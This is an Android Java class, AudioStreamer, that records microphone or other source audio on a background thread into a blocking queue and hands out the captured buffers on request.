package my.app.Library;

import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.util.Log;

public class AudioStreamer {

	public final String TAG = "AudioStreamer";
	public boolean stop = false;

	public BlockingQueue<byte[]> bbq = new LinkedBlockingQueue<byte[]>();

	int frequency = 11025;
	int channelConfiguration = AudioFormat.CHANNEL_CONFIGURATION_MONO;
	int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;

	int bufferSizeRecorder;
	byte[] buffer;
	byte[] buff;
	AudioRecord audioRecord;
	Thread threcord;
	Context ctx;
	int chan;

	public AudioStreamer(OnRecordPositionUpdateListener c, int source, int chan) {
		this.chan = chan;
		bufferSizeRecorder = AudioRecord.getMinBufferSize(frequency, channelConfiguration, audioEncoding);
		audioRecord = new AudioRecord(source, frequency, channelConfiguration, audioEncoding, bufferSizeRecorder);

		audioRecord.setPositionNotificationPeriod(512);
		audioRecord.setRecordPositionUpdateListener(c);

		threcord = new Thread(new Runnable() {
			public void run() {
				record();
			}
		});

	}

	public void run() {
		Log.i(TAG, "Launch record thread");
		stop = false;
		threcord.start();
	}

	public void record() {
		try {
			if (audioRecord.getState() == AudioRecord.STATE_UNINITIALIZED) {
				Log.e(TAG, "Initialisation failed !");
				audioRecord.release();
				audioRecord = null;
				return;
			}

			buffer = new byte[bufferSizeRecorder];
			audioRecord.startRecording();

			while (!stop) {
				int bufferReadResult = audioRecord.read(buffer, 0, bufferSizeRecorder);
				byte[] tmp = new byte[bufferReadResult];
				System.arraycopy(buffer, 0, tmp, 0, bufferReadResult);
				bbq.add(tmp);

			}

			audioRecord.stop();

		} catch (Throwable t) {
			Log.e("AudioRecord", "Recording Failed");
		}

	}

	public byte[] getData() {
		try {
			if (!bbq.isEmpty()) {
				return bbq.take();
			}
		} catch (InterruptedException e) {
		}
		return null;
	}

	public void stop() {
		stop = true;
	}

	public int getChannel() {
		return chan;
	}
}
